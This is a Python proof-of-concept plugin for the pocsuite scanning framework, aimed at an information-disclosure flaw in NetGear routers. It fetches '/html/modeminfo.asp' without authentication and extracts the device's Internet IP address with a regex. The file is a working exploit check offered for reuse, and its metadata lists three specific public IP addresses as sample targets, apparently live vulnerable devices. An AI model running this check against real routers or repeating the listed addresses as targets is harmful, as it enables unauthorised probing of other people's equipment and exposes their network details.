#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import urllib
import re
import random
import hashlib

class TestPOC(POCBase):
    name = "NetGear router information"
    vulID = ''
    author = ['sebao']
    vulType = 'Information Disclosure '
    version = '1.0'    # default version: 1.0
    references = ['https://www.exploit-db.com/ghdb/4375/']
    desc = 'NetGear router information'

    vulDate = ''
    createDate = '2016-12-27'
    updateDate = '2016-12-27'

    appName = 'NetGear'
    appVersion = ''
    appPowerLink = 'http://www.netgear.com'
    samples = ['http://162.192.49.134/',
               'http://75.14.194.254/',
               'http://69.106.120.78/']

    def _attack(self):

        return self._verify()



    def _verify(self):
        '''verify mode'''
        result = {}
        vul_url = "/html/modeminfo.asp"
        url = self.url + vul_url

        resp = req.get(url)
        if resp.status_code == 200 and 'Connection Information' in resp.content :
                rawstr = r"""Internet IP(.+?)Address</td><td>(.+?)</td>"""
                compile_obj = re.compile(rawstr)
                match_obj = compile_obj.search(resp.content)
                ip = match_obj.group(2)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['IP'] = ip


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
